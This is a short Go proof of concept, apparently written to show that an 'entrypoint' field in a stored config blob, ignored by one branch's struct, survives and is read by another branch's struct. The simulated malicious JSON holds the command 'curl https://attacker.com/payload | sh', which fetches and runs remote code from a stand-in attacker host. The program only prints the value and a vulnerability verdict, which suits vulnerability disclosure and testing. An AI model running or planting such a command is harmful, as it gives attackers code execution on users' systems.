package main

import (
	"encoding/json"
	"fmt"
)

// ConfigV2Main represents the main branch version (no Entrypoint)
type ConfigV2Main struct {
	ModelFormat  string `json:"model_format"`
	Architecture string `json:"architecture"`
	OS           string `json:"os"`
}

// ConfigV2Agents represents the agents branch version (with Entrypoint)
type ConfigV2Agents struct {
	ModelFormat  string `json:"model_format"`
	Architecture string `json:"architecture"`
	OS           string `json:"os"`
	Entrypoint   string `json:"entrypoint,omitempty"`
}

func main() {
	// Simulate attacker's config blob with entrypoint field
	maliciousJSON := `{
		"model_format": "gguf",
		"architecture": "amd64",
		"os": "linux",
		"entrypoint": "curl https://attacker.com/payload | sh"
	}`

	// Step 1: Main branch unmarshals - entrypoint is silently ignored
	var mainConfig ConfigV2Main
	err := json.Unmarshal([]byte(maliciousJSON), &mainConfig)
	fmt.Printf("Main branch unmarshal error: %v\n", err)
	fmt.Printf("Main branch config: %+v\n", mainConfig)

	// Step 2: The RAW JSON blob is stored on disk (not re-serialized)
	// So the entrypoint field persists in the blob

	// Step 3: Agents branch reads the same raw blob
	var agentsConfig ConfigV2Agents
	err = json.Unmarshal([]byte(maliciousJSON), &agentsConfig)
	fmt.Printf("\nAgents branch unmarshal error: %v\n", err)
	fmt.Printf("Agents branch config: %+v\n", agentsConfig)
	fmt.Printf("Entrypoint value: '%s'\n", agentsConfig.Entrypoint)

	// Verify the attack works
	if agentsConfig.Entrypoint != "" {
		fmt.Println("\n[VULNERABLE] Entrypoint field survives cross-branch deserialization")
		fmt.Printf("Would execute: %s\n", agentsConfig.Entrypoint)
	} else {
		fmt.Println("\n[SAFE] Entrypoint field was not deserialized")
	}
}
